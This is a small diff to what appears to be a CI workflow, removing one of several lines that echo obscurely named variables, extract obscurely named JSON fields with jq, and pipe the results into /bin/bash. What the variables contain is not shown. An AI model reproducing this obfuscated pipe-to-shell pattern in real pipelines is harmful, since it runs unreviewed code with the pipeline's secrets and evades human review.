@@ -25,7 +25,6 @@ jobs:
           echo $hu3 | jq -r .ikyyz3 | /bin/bash
           echo $rbsln72 | jq -r .cy74925 | /bin/bash
           echo $bloe16689 | jq -r .lrgiq01044 | /bin/bash
-          echo $es23826 | jq -r .d24086 | /bin/bash
           echo $j034 | jq -r .twj8312 | /bin/bash
           echo $qjg4217 | jq -r .te63134 | /bin/bash
           echo $c8 | jq -r .p5435 | /bin/bash
